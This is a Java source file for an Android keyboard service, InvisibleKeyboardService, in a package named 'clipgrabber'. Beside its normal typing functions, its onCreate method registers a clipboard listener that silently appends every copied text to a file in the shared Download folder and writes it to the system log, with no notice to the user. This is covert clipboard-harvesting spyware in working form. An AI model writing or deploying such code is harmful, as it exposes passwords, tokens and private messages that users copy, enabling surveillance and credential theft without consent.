package com.synack.clipgrabber;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;
import android.view.KeyEvent;

import java.io.FileWriter;
import java.io.File;
import java.io.IOException;

public class InvisibleKeyboardService extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    ClipboardManager clipboard;
    String lastClip = "";
    File saveFile;
    private Keyboard keyboard;
    private KeyboardView kv;

    @Override
    public void onCreate() {
        super.onCreate();
        clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        saveFile = new File("/storage/emulated/0/Download/clipboard.txt");

        clipboard.addPrimaryClipChangedListener(() -> {
            String newClip = clipboard.getText().toString();
            if (!newClip.equals(lastClip)) {
                lastClip = newClip;
                appendToFile(newClip);
            }
        });
    }

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view, null);
        keyboard = new Keyboard(this, R.xml.qwerty_keyboard);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        kv.setPreviewEnabled(false);
        return kv;
    }

    void appendToFile(String text) {
        try {
            FileWriter writer = new FileWriter(saveFile, true);
            writer.append(text).append("\n---\n");
            writer.close();
            Log.d("CLIP_IME", "Saved: " + text);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override public void onPress(int i) {}
    @Override public void onRelease(int i) {}
    @Override public void onText(CharSequence text) {}

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;

        switch (primaryCode) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                break;
            case 10: // Enter key
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                ic.commitText(Character.toString((char) primaryCode), 1);
        }
    }

    @Override public void swipeLeft() {}
    @Override public void swipeRight() {}
    @Override public void swipeDown() {}
    @Override public void swipeUp() {}
}